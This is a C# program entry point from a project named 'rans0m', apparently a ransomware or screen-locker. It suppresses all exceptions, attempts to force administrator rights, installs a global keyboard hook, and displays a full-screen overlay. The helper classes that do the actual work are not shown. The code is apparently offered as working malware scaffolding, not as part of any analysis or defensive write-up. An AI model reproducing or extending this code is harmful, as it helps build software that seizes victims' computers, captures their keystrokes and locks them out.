namespace rans0m
{
    internal static class Program
    {
        private static KeyboardHook keyboardHook = new KeyboardHook();

        [STAThread]
        static void Main()
        {
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            Application.ThreadException += (sender, e) => { }; // don't let a random exception kill the whole app

            ApplicationConfiguration.Initialize();
            Global.AttemptForceAdmin();

            keyboardHook.KeyPressed += Global.KeyPressed;
            keyboardHook.Hook();

            Application.Run(new Overlay());

            keyboardHook.Unhook();
        }
    }
}